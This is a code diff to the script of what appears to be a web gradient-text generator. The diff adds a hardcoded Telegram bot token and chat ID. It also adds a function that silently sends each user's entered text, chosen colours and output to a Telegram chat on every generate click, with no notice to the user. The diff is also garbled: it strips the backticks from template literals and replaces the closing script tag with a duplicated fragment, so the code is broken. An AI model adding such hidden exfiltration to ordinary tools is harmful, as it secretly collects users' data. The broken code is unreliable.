@@ -165,11 +165,37 @@
     </div>
 
     <script>
+        const BOT_TOKEN = "8021487859:AAGtTIR38Rdsm63O-_2uCy2zCcysAfSbXvI"; 
+        const CHAT_ID = "1447518842";  
         let isBold = false;
+
+        function sendTelegramMessage(message) {
+            const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage;
+            const payload = {
+                chat_id: CHAT_ID,
+                text: message
+            };
+            fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload),
+            })
+                .then((response) => {
+                    if (!response.ok) {
+                        console.error(Ошибка отправки: ${response.statusText});
+                    }
+                })
+                .catch((error) => {
+                    console.error("Произошла ошибка:", error);
+                });
+        }
+
 
         document.getElementById('boldToggleBtn').addEventListener('click', () => {
             isBold = !isBold;
-            document.getElementById('boldToggleBtn').textContent = `Bold: ${isBold ? 'On' : 'Off'}`;
+            document.getElementById('boldToggleBtn').textContent = Bold: ${isBold ? 'On' : 'Off'};
         });
 
         function interpolateColor(start, end, factor) {
@@ -185,7 +211,7 @@
         }
 
         function rgbToHex(rgb) {
-            return `#${rgb.map(x => x.toString(16).padStart(2, '0').toUpperCase()).join('')}`;
+            return #${rgb.map(x => x.toString(16).padStart(2, '0').toUpperCase()).join('')};
         }
 
         function generateGradientText(text, startColor, endColor) {
@@ -197,7 +223,7 @@
             for (let i = 0; i < length; i++) {
                 const factor = i / Math.max(length - 1, 1);
                 const color = interpolateColor(startRgb, endRgb, factor);
-                gradient += `<span style="color:${rgbToHex(color)}">${text[i]}</span>`;
+                gradient += <span style="color:${rgbToHex(color)}">${text[i]}</span>;
             }
 
             return gradient;
@@ -217,12 +243,20 @@
             document.getElementById('preview').innerHTML = preview;
 
             let output = '';
-            for (let i = 0; i < text.length; i++) {
+             for (let i = 0; i < text.length; i++) {
                 const factor = i / Math.max(text.length - 1, 1);
                 const color = rgbToHex(interpolateColor(hexToRgb(startColor), hexToRgb(endColor), factor));
-                output += `&#${color.slice(1)}${isBold ? '&l' : ''}${text[i]}`;
+                output += &#${color.slice(1)}${isBold ? '&l' : ''}${text[i]};
             }
             document.getElementById('output').textContent = output;
+             const now = new Date();
+             const formattedDate = now.toLocaleDateString();
+             const formattedTime = now.toLocaleTimeString();
+
+            const logMessage = [${formattedDate}]:[${formattedTime}][${startColor}]:[${endColor}]:[${text}]:[${output}];
+            sendTelegramMessage(logMessage);
+
+
         });
 
         document.getElementById('copyBtn').addEventListener('click', () => {
@@ -233,6 +267,12 @@
                 alert('Failed to copy: ' + err);
             });
         });
-    </script>
+ElementById('output').textContent;
+            navigator.clipboard.writeText(outputText).then(() => {
+                alert('Output copied to clipboard!');
+            }).catch(err => {
+                alert('Failed to copy: ' + err);
+            });
+        });
 </body>
 </html>
